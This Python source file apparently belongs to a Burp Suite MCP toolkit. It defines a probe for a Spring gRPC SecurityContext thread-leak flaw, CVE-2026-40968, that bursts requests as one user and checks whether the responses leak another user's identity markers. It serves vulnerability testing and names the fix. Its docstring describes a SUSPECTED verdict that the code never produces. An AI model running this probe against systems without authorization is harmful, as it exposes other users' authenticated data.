"""probe_spring_grpc_thread_leak — CVE-2026-40968.

Spring Boot gRPC SecurityContext is bound to the request thread. The fix
expected per-call cleanup; pre-patch versions leave the previous request's
SecurityContext attached to the thread. When the thread serves a subsequent
gRPC call before the framework re-binds context, the new call inherits the
prior caller's authentication.

Strategy (operator-driven):
  1. Send N gRPC calls authenticated as user A → save baseline responses.
  2. Without delay, send N calls authenticated as user B against the same
     endpoint.
  3. CONFIRMED if any user-B response leaks user-A markers (username, email,
     account id, tenant id, role).

Returns VerdictResult. Requires two distinct sessions or two bearer tokens.
"""

from __future__ import annotations

import asyncio

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import make_verdict, error_verdict


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_spring_grpc_thread_leak(
        target_url: str,
        user_a_marker: str,
        user_b_session: str,
        burst_count: int = 20,
        user_a_session: str = "",
        user_a_bearer: str = "",
        user_b_bearer: str = "",
    ) -> dict:
        """Probe Spring gRPC SecurityContext thread carry-over (CVE-2026-40968).

        Args:
            target_url: gRPC endpoint URL returning identity / per-user state.
            user_a_marker: unique substring identifying user A in responses
                (username, email fragment, account id). Operator harvests
                this from a baseline A-authed call before invoking.
            user_b_session: session name for user B.
            burst_count: how many B-authed calls to fire (default 20).
                Higher = better chance of catching the thread carry race.
            user_a_session: optional A session (for pre-warm). Either
                user_a_session or user_a_bearer required.
            user_a_bearer: optional A bearer token.
            user_b_bearer: optional B bearer token (if not session-based).

        Returns: VerdictResult. CONFIRMED if any B-authed response contains
        user_a_marker; SUSPECTED on partial pattern (response length anomaly).
        """
        if not target_url or not user_a_marker or not (user_b_session or user_b_bearer):
            return error_verdict(
                "target_url, user_a_marker, user_b_session/user_b_bearer required",
                vuln_type="spring_grpc_thread_leak",
            )

        logger_indices: list[int] = []

        # Pre-warm user A's session so the SecurityContext is bound to a
        # worker thread.
        if user_a_session or user_a_bearer:
            for _ in range(3):
                pre = await _send(target_url, user_a_session, user_a_bearer)
                li = pre.get("logger_index", -1)
                if isinstance(li, int) and li >= 0:
                    logger_indices.append(li)

        # Burst of B-authed calls
        tasks = [_send(target_url, user_b_session, user_b_bearer)
                 for _ in range(burst_count)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        reproductions: list[dict] = []
        leaks: list[dict] = []
        for i, resp in enumerate(responses):
            if isinstance(resp, BaseException):
                continue
            li = resp.get("logger_index", -1)
            if isinstance(li, int) and li >= 0:
                logger_indices.append(li)
            body = resp.get("response_body", "") or ""
            entry = {
                "burst_index": i,
                "status_code": resp.get("status_code"),
                "logger_index": li,
            }
            reproductions.append(entry)
            if user_a_marker in body:
                entry["matched"] = "user_a_marker_leaked"
                entry["body_excerpt"] = body[body.find(user_a_marker):
                                             body.find(user_a_marker) + 200]
                leaks.append(entry)

        if leaks:
            return make_verdict(
                "CONFIRMED", 0.92,
                f"Spring gRPC SecurityContext thread leak — {len(leaks)} of "
                f"{burst_count} user-B calls returned user-A marker "
                f"`{user_a_marker}`. CVE-2026-40968 class.",
                vuln_type="spring_grpc_thread_leak",
                logger_indices=logger_indices,
                reproductions=reproductions,
                details={"leak_count": len(leaks), "burst_count": burst_count,
                         "first_leak": leaks[0],
                         "fix": "Upgrade Spring gRPC; ensure SecurityContext "
                                "cleared in finally{} of per-call interceptor"},
                summary=f"CONFIRMED Spring gRPC thread leak on {target_url}",
            )

        return make_verdict(
            "FAILED", 0.10,
            f"No user-A marker leak across {burst_count} user-B calls",
            vuln_type="spring_grpc_thread_leak",
            logger_indices=logger_indices,
            reproductions=reproductions,
            summary=f"FAILED — no Spring gRPC thread leak on {target_url}",
        )


async def _send(url: str, session: str, bearer: str) -> dict:
    headers = [{"name": "Content-Type", "value": "application/grpc"},
               {"name": "Te", "value": "trailers"}]
    if bearer:
        headers.append({"name": "Authorization", "value": f"Bearer {bearer}"})
    if session:
        return await client.post("/api/session/request", json={
            "session": session, "method": "POST", "url": url, "headers": headers,
        })
    return await client.post("/api/http/curl", json={
        "method": "POST", "url": url, "headers": headers,
    })
